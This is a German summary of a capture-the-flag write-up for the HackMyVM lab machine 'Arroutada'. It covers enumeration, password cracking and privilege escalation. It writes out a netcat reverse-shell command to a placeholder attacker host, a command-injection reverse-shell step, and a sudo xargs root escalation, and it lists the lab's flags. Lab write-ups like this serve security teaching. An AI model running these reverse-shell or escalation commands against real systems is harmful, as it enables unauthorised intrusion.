# Arroutada - HackMyVM Writeup

![Arroutada VM Icon](Arroutada.png)

Dieses Repository enthält das Writeup für die HackMyVM-Maschine "Arroutada" (Schwierigkeitsgrad: Easy), erstellt von DarkSpirit. Ziel war es, initialen Zugriff auf die virtuelle Maschine zu erlangen und die Berechtigungen bis zum Root-Benutzer zu eskalieren.

## VM-Informationen

*   **VM Name:** Arroutada
*   **Plattform:** HackMyVM
*   **Autor der VM:** DarkSpirit
*   **Schwierigkeitsgrad:** Easy
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=Arroutada](https://hackmyvm.eu/machines/machine.php?vm=Arroutada)

## Writeup-Informationen

*   **Autor des Writeups:** Ben C.
*   **Datum des Berichts:** 08. April 2023
*   **Link zum Original-Writeup (GitHub Pages):** [https://alientec1908.github.io/Arroutada_HackMyVM_Easy/](https://alientec1908.github.io/Arroutada_HackMyVM_Easy/)

## Kurzübersicht des Angriffspfads

Der Angriff auf die Arroutada-Maschine umfasste folgende Schritte:

1.  **Reconnaissance:**
    *   Identifizierung der Ziel-IP (`192.168.2.124`) mittels `arp-scan`.
    *   Ein `nmap`-Scan offenbarte nur Port 80 (HTTP, Apache 2.4.54) als offen.
2.  **Web Enumeration:**
    *   Download einer Bilddatei (`apreton.png`) von der Webseite.
    *   `exiftool` extrahierte aus den Metadaten des Bildes den Pfad-Hinweis `{"path": "/scout"}`.
    *   Im Verzeichnis `/scout/` wurde eine Nachricht gefunden, die auf `/scout/******/docs/` verwies.
    *   `gobuster` entdeckte das Verzeichnis `/scout/j2/docs/` und darin die Datei `pass.txt` sowie eine passwortgeschützte ODS-Datei (`shellfile.ods`).
    *   Die Dateien wurden mit `wget` heruntergeladen.
    *   `libreoffice2john` extrahierte den Hash der `shellfile.ods`, und `john` knackte das Passwort als `john11`.
    *   In der (entschlüsselten) `shellfile.ods` wurde der Pfad zu einer Webshell (`/thejabasshell.php`) gefunden.
    *   `wfuzz` wurde verwendet, um die Parameter der Webshell zu ermitteln (`a` für Befehl, `b` für Passwort). Das Passwort `pass` wurde als funktionierend identifiziert.
3.  **Initial Access:**
    *   Die Webshell (`/thejabasshell.php?a=[BEFEHL]&b=pass`) wurde genutzt, um eine Netcat-Reverse-Shell zum Angreifer-System zu initiieren (`nc -e /bin/bash [ATTACKER_IP] [PORT]`).
    *   Eine interaktive Shell als Benutzer `www-data` wurde erlangt und stabilisiert.
4.  **Privilege Escalation (www-data zu drito):**
    *   `ss -tulpe` auf dem Zielsystem zeigte einen lokalen Dienst auf `127.0.0.1:8000`, der als Benutzer `drito` (UID 1001) lief.
    *   `curl` wurde vom Angreifer-System auf das Ziel übertragen.
    *   Eine erste Anfrage an den lokalen Dienst lieferte Brainfuck-Code, der zu "all HackMyVM hackers!!" dekodierte.
    *   Die `www-data`-Shell wurde zu einer Meterpreter-Session aufgewertet.
    *   Meterpreter `autoroute` und `portfwd` wurden genutzt, um den internen Dienst auf Port 8000 für den Angreifer erreichbar zu machen. Alternativ wurde ein `nc`-Tunnel erstellt.
    *   Ein HTML-Kommentar auf der Hauptseite des internen Dienstes (`http://192.168.2.124:8001`) verwies auf `/priv.php`.
    *   `/priv.php` hatte eine Command Injection-Schwachstelle: Es akzeptierte einen JSON-Parameter `command` via POST, dessen Wert direkt an `system()` übergeben wurde.
    *   Eine POST-Anfrage an `/priv.php` mit einem Reverse-Shell-Payload im `command`-Parameter führte zu einer Shell als Benutzer `drito`.
5.  **Privilege Escalation (drito zu root):**
    *   `sudo -l` für `drito` zeigte, dass der Benutzer `/usr/bin/xargs` als jeder Benutzer ohne Passwort ausführen durfte (`(ALL : ALL) NOPASSWD: /usr/bin/xargs`).
    *   Mit dem Befehl `sudo xargs -a /dev/null bash` wurde eine Root-Shell erlangt.
    *   Die Root-Flag in `/root/root.txt` war Base64-kodiert und ROT13-verschlüsselt. Sie wurde dekodiert zu `ThanksToSmlAndAllHackMyVM`.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `wget`
*   `exiftool`
*   `gobuster`
*   `libreoffice2john`
*   `john`
*   `nikto`
*   `wfuzz`
*   `curl`
*   `nc` (netcat)
*   `python3`
*   `pty` (impliziert in `script`)
*   `stty`
*   `ss`
*   `cp`
*   `chmod`
*   `Metasploit (msfconsole)`
*   `meterpreter`
*   `script`
*   `sudo`
*   `xargs`
*   `bash`
*   `id`
*   `cd`
*   `ls`
*   `cat`
*   `echo`
*   `base64`
*   `tr`

## Identifizierte Schwachstellen (Zusammenfassung)

*   **Informationen in Bild-Metadaten:** Ein Pfad (`/scout`) wurde in den Exif-Daten eines Bildes gefunden.
*   **Versteckte Hinweise in Webseiten-Inhalten:** Nachrichten lieferten Hinweise auf Verzeichnisstrukturen.
*   **Exponierte sensible Dateien und Verzeichnisse:** `pass.txt` und passwortgeschützte Office-Dokumente waren über das Web zugänglich.
*   **Schwaches Passwort für Office-Dokument:** Das Passwort für `shellfile.ods` konnte mit `rockyou.txt` geknackt werden.
*   **Vorhandensein einer Webshell:** `thejabasshell.php` ermöglichte Remote Code Execution.
*   **Schwaches Authentifizierungstoken für Webshell:** Das Passwort `pass` für die Webshell war leicht zu fuzzen.
*   **Interner Dienst mit Command Injection:** `/priv.php` auf `127.0.0.1:8000` war anfällig für Command Injection via JSON POST-Parameter.
*   **Unsichere `sudo`-Konfiguration:** Der Benutzer `drito` konnte `/usr/bin/xargs` ohne Passwort als Root ausführen, was eine direkte Privilegieneskalation ermöglichte.
*   **Mehrfache Kodierung der Root-Flag:** Die Flag war Base64 und ROT13 kodiert.

## Flags

*   **User Flag (`/home/drito/user.txt`):** `785f64437c6e1f9af6aa1afcc91ed27c`
*   **Root Flag (`/root/root.txt`):** `ThanksToSmlAndAllHackMyVM` (dekodiert aus `R3VuYXhmR2JGenlOYXFOeXlVbnB4WmxJWg==`)

---

**Wichtiger Hinweis:** Dieses Dokument und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die beschriebenen Techniken und Werkzeuge sollten nur in legalen und autorisierten Umgebungen (z.B. eigenen Testlaboren, CTFs oder mit expliziter Genehmigung) angewendet werden. Das unbefugte Eindringen in fremde Computersysteme ist eine Straftat und kann rechtliche Konsequenzen nach sich ziehen.

---
*Bericht von Ben C. - Cyber Security Reports*
